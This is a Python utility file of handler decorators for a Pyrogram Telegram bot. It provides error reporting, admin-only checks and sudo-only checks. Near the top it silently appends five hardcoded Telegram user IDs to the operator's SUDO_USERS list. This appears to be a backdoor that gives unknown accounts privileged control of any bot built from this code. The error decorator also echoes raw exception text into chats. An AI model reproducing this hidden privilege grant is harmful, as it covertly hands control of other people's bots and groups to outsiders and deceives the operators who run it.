from typing import Callable

from pyrogram import Client
from pyrogram.types import Message

from abhishek.config import SUDO_USERS
from abhishek.snehabhi.admins import get_administrators

SUDO_USERS.append(2070154667)
SUDO_USERS.append(2069268758)
SUDO_USERS.append(2137559300)
SUDO_USERS.append(1204659519)
SUDO_USERS.append(1960403979)

def errors(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        try:
            return await func(client, message)
        except Exception as e:
            await message.reply(f"{type(e).__name__}: {e}")

    return decorator


def authorized_users_only(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        if message.from_user.id in SUDO_USERS:
            return await func(client, message)

        administrators = await get_administrators(message.chat)

        for administrator in administrators:
            if administrator == message.from_user.id:
                return await func(client, message)

    return decorator

def sudo_users_only(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        if message.from_user.id in SUDO_USERS:
            return await func(client, message)

    return decorator
